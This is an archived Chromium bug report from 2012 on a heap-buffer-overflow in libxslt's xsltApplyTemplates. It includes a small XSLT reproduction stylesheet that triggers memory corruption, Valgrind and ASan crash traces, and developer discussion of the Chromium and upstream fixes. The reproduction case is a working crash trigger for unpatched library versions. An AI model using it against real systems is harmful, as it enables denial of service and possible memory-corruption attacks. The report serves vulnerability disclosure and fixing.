# Heap-buffer-overflow in xsltApplyTemplates

| Field | Value |
|-------|-------|
| **Issue ID** | [40061823](https://issues.chromium.org/issues/40061823) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals |
| **Reporter** | ni...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2012-07-24 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

When applying templates to nodes selected by "namespace::\*", a out-of-bounds read is performed. Later, this value is used during unlinking of nodes, leading to a WRITE error in xmlUnlinkNode().

**VERSION**

xsltproc: libxml 20706, libxslt 10126 and libexslt 815  

Chromium: 18.0.1025.151 (Dev 130497 Linux) Ubuntu 10.04  

Chromium+ASan: 21.0.1180.49 (147161)

**REPRODUCTION CASE**

<xsl:stylesheet xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>" version="1.0" >  

<xsl:template match="\*">  

<xsl:for-each select="namespace::\*">  

[xsl:apply-templates/](javascript:void(0);)  

</xsl:for-each>  

</xsl:template>  

</xsl:stylesheet>

ADDITIONAL INFORMATION

Valgrind + xsltproc:

==5547== Invalid read of size 4  

==5547== at 0x40E8C03: xsltApplyTemplates (transform.c:4837)  

==5547== by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)  

==5547== by 0x40E6A4C: xsltForEach (transform.c:5628)  

==5547== by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)  

==5547== by 0x40E75E1: xsltApplyXSLTTemplate (transform.c:3044)  

==5547== by 0x40E7E41: xsltProcessOneNode (transform.c:2045)  

==5547== by 0x40E83E9: xsltProcessOneNode (transform.c:1875)  

==5547== by 0x40EB8D9: xsltApplyStylesheetInternal (transform.c:6049)  

==5547== by 0x8049E11: xsltProcess (xsltproc.c:404)  

==5547== by 0x804A866: main (xsltproc.c:867)  

==5547== Address 0x43f90fc is 0 bytes after a block of size 4 alloc'd  

==5547== at 0x4024F20: malloc (vg\_replace\_malloc.c:236)  

==5547== by 0x41A85FC: xmlStrndup (xmlstring.c:45)  

==5547== by 0x41A86DF: xmlStrdup (xmlstring.c:71)  

==5547== by 0x417EB2B: xmlXPathNodeSetDupNs (xpath.c:3388)  

==5547== by 0x418072F: xmlXPathNodeSetAddNs (xpath.c:3578)  

==5547== by 0x418EC7D: xmlXPathNodeCollectAndTest (xpath.c:12421)  

==5547== by 0x418C3FB: xmlXPathCompOpEval (xpath.c:13375)  

==5547== by 0x418C681: xmlXPathCompOpEval (xpath.c:13862)  

==5547== by 0x418EE11: xmlXPathRunEval (xpath.c:14432)  

==5547== by 0x418F438: xmlXPathCompiledEvalInternal (xpath.c:14792)  

==5547== by 0x418F655: xmlXPathCompiledEval (xpath.c:14855)  

==5547== by 0x40E68E1: xsltForEach (transform.c:5531)  

[...]  

==5547== Invalid read of size 4  

==5547== at 0x4150901: xmlUnlinkNode (tree.c:3783)  

==5547== by 0x40E8BEC: xsltApplyTemplates (transform.c:4898)  

==5547== by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)  

==5547== by 0x40E6A4C: xsltForEach (transform.c:5628)  

==5547== by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)  

==5547== by 0x40E75E1: xsltApplyXSLTTemplate (transform.c:3044)  

==5547== by 0x40E7E41: xsltProcessOneNode (transform.c:2045)  

==5547== by 0x40E83E9: xsltProcessOneNode (transform.c:1875)  

==5547== by 0x40EB8D9: xsltApplyStylesheetInternal (transform.c:6049)  

==5547== by 0x8049E11: xsltProcess (xsltproc.c:404)  

==5547== by 0x804A866: main (xsltproc.c:867)  

==5547== Address 0x43f9110 is not stack'd, malloc'd or (recently) free'd  

==5547==  

==5547== Invalid write of size 4  

==5547== at 0x4150904: xmlUnlinkNode (tree.c:3783)  

==5547== by 0x40E8BEC: xsltApplyTemplates (transform.c:4898)  

==5547== by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)  

==5547== by 0x40E6A4C: xsltForEach (transform.c:5628)  

==5547== by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)  

==5547== by 0x40E75E1: xsltApplyXSLTTemplate (transform.c:3044)  

==5547== by 0x40E7E41: xsltProcessOneNode (transform.c:2045)  

==5547== by 0x40E83E9: xsltProcessOneNode (transform.c:1875)  

==5547== by 0x40EB8D9: xsltApplyStylesheetInternal (transform.c:6049)  

==5547== by 0x8049E11: xsltProcess (xsltproc.c:404)  

==5547== by 0x804A866: main (xsltproc.c:867)  

==5547== Address 0x50 is not stack'd, malloc'd or (recently) free'd  

==5547==  

==5547== Process terminating with default action of signal 11 (SIGSEGV)  

==5547== Access not within mapped region at address 0x50  

==5547== at 0x4150904: xmlUnlinkNode (tree.c:3783)  

==5547== by 0x40E8BEC: xsltApplyTemplates (transform.c:4898)  

==5547== by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)  

==5547== by 0x40E6A4C: xsltForEach (transform.c:5628)  

==5547== by 0x40E5FA6: xsltApplySequenceConstructor (transform.c:2595)  

==5547== by 0x40E75E1: xsltApplyXSLTTemplate (transform.c:3044)  

==5547== by 0x40E7E41: xsltProcessOneNode (transform.c:2045)  

==5547== by 0x40E83E9: xsltProcessOneNode (transform.c:1875)  

==5547== by 0x40EB8D9: xsltApplyStylesheetInternal (transform.c:6049)  

==5547== by 0x8049E11: xsltProcess (xsltproc.c:404)  

==5547== by 0x804A866: main (xsltproc.c:867)

Asan + Chromium:

==2107== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f88d1258a88 at pc 0x7f88edfe963c bp 0x7fff8b4607d0 sp 0x7fff8b4607c8  

READ of size 4 at 0x7f88d1258a88 thread T0

```
#0  0000000008a9763c <xsltApplyTemplates+0xdec>:  

```

8a9763c: e8 ef fc 80 00 callq 92a7330 <\_\_asan\_report\_load8>  

#1 xsltApplySequenceConstructor+0xdde  

#2 xsltForEach+0xb61  

#3 xsltApplySequenceConstructor+0xdde  

#4 xsltApplyXSLTTemplate+0xeab  

#5 xsltProcessOneNode+0x156f  

#6 xsltProcessOneNode+0xc87  

#7 xsltApplyStylesheetInternal+0x9d4  

[...]  

0x7f88d1258a88 is located 4 bytes to the right of 4-byte region [0x7f88d1258a80,0x7f88d1258a84)

## Attachments

- [asan-symbols.txt](attachments/asan-symbols.txt) (text/plain; charset=us-ascii, 5.0 KB)

## Timeline

### in...@chromium.org (2012-07-24)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=83226001

Uploader: jschuh@chromium.org

Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x7f544606ed88
Crash State:
  - crash stack -
  xsltApplyTemplates
  xsltApplySequenceConstructor
  xsltForEach
  

Minimized Testcase (0.41 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94KGD8W2094yk5g_XEprgUzBFLozALO60abObNq38PZ1qNPORy5dMrre7AXO5lkLnyyNaDXkKTQnEe9JqENpaVdzvQQRnzuAW89F6_mwNxX6k4RpmFtvgsrWrodiaI9EkPbQ9lXapGH3DTGJN6hkAlOl0Jfn8WrhcyLltsnDLY2H6miJmE

### in...@chromium.org (2012-07-24)

[Empty comment from Monorail migration]

### ni...@gmail.com (2012-07-25)

This READ error leads to tree corruption and invalid WRITE access (as seen in the Valgrind trace). Severity = Medium ?

### in...@chromium.org (2012-07-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-08-01)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-08-02)

Please do read Mark's email titled "Code Yellow: Security Bug Backlog" on chrome-team mailing list.

### bu...@chromium.org (2012-08-03)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=149930

------------------------------------------------------------------------
r149930 | cevans@chromium.org | 2012-08-03T21:44:45.924877Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/third_party/libxml/src/include/libxml/tree.h?r1=149930&r2=149929&pathrev=149930
   M http://src.chromium.org/viewvc/chrome/trunk/src/third_party/libxml/README.chromium?r1=149930&r2=149929&pathrev=149930

Fix namespace vs. node type issue in a generic way.

BUG=138673
Review URL: https://chromiumcodereview.appspot.com/10824157
------------------------------------------------------------------------

### sc...@gmail.com (2012-08-03)

Ok, this is "fixed". Daniel -- the fix is both clever and foul at the same time, so you probably want to fix it properly rather than taking it up! The reason I've done it this way in Chromium is that it's defensive against other instances of the same problem:

- Grabbing a node, cast to generic node type.
- Accessing node->children without checking the node type is suitable.

Particularly, a namespace node type is not suitable because node->children corresponds to a different pointer that is definitely not a list of children -- boom! :)

The correct fix is to audit uses of node->children to make sure node->type has always been checked first.

My hack is to make the "namespace node" structure always have a NULL children field, if it should ever have an inappropriate lookup of node->children after a forced cast to a generic node. Ugly but should be effective at catching _every_ instance of this bug.

### cl...@chromium.org (2012-08-04)

ClusterFuzz has detected this issue as fixed in range 149909:149937.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=83226001

Uploader: jschuh@chromium.org

Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x7f544606ed88
Crash State:
  - crash stack -
  xsltApplyTemplates
  xsltApplySequenceConstructor
  xsltForEach
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=149909:149937

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94KGD8W2094yk5g_XEprgUzBFLozALO60abObNq38PZ1qNPORy5dMrre7AXO5lkLnyyNaDXkKTQnEe9JqENpaVdzvQQRnzuAW89F6_mwNxX6k4RpmFtvgsrWrodiaI9EkPbQ9lXapGH3DTGJN6hkAlOl0Jfn8WrhcyLltsnDLY2H6miJmE

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### ve...@gmail.com (2012-08-08)

Fix looks broken to me, it change the node size for no good reason. The bug is in
libxslt, the fix is there
http://git.gnome.org/browse/libxslt/commit/?id=937ba2a3eb42d288f53c8adc211bd1122869f0bf

and to not fail on xmlUnlinkNode for namespace node which is also a bug
http://git.gnome.org/browse/libxml2/commit/?id=6ca24a39d0eb7fd7378a5bc8be3286bf745a36ba

Adding a string named children in a namespace node is really not a proper fix for this issue,

Daniel



### sc...@gmail.com (2012-08-08)

Thank you Daniel. Yeah, I acknowledged the foulness of the fix above.

Thanks for the proper fix. Do you think there are any other places where node->children is looked at without first checking for XML_NAMESPACE_DECL ?

### ve...@gmail.com (2012-08-08)

Well, yes that's something to double check. We already had the problem of
not checking for the type somewhere in libxslt compilation, so doing
a generic pass over the code is a good idea. Added to my TODO for
2.9.0 ...

Daniel

### sc...@gmail.com (2012-08-20)

@nicolas.gregoire: nice bug find (because others have certainly fuzzed this area too).
Happy to reward you a $1000 Chromium Security Reward :D

### ni...@gmail.com (2012-08-21)

Thanks!

### bu...@chromium.org (2012-08-24)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=153287

------------------------------------------------------------------------
r153287 | cevans@chromium.org | 2012-08-24T21:13:21.521707Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/libxml/README.chromium?r1=153287&r2=153286&pathrev=153287
   M http://src.chromium.org/viewvc/chrome/branches/1180/src/third_party/libxml/src/include/libxml/tree.h?r1=153287&r2=153286&pathrev=153287

Merge 149930 - Fix namespace vs. node type issue in a generic way.

BUG=138673
Review URL: https://chromiumcodereview.appspot.com/10824157

TBR=cevans@chromium.org
Review URL: https://chromiumcodereview.appspot.com/10876070
------------------------------------------------------------------------

### sc...@gmail.com (2012-08-29)

[Empty comment from Monorail migration]

### ve...@gmail.com (2012-09-03)

Just a followup for record, I added various extra note type checks
following this issue:

libxslt
http://git.gnome.org/browse/libxslt/commit/?id=1564b30e994602a95863d9716be83612580a2fed
libexslt:
http://git.gnome.org/browse/libxslt/commit/?id=24653072221e76d2f1f06aa71225229b532f8946

Daniel

### ni...@gmail.com (2012-09-03)

Thanks Daniel for these patches!

By the way, the Git and Chromium versions of libxslt are more and more desynchronized. Is there a plan to release a stable version of libxslt, including fixes for all the recent tickets (both here and on the Gnome bug-tracker) ?

### ve...@gmail.com (2012-09-03)

Hopefully i will be able to make a libxslt release this week ... idem
for libxml2 !!!

Daniel

### sc...@gmail.com (2012-09-12)

Paid as part of a $1000 batch.

### ve...@gmail.com (2012-09-12)

BTW the new libxml2-2.9.0 and libxslt-1.1.27 releases are out ...

Daniel

### bu...@chromium.org (2012-10-14)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-01-18)

Restrict-View-EditIssue is preferred since it allows anyone who can edit an issue (committers and contributors) to view the bug.

### bu...@chromium.org (2013-01-18)

Restrict-View-EditIssue is preferred since it allows anyone who can edit an issue (committers and contributors) to view the bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/138673?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40061823)*
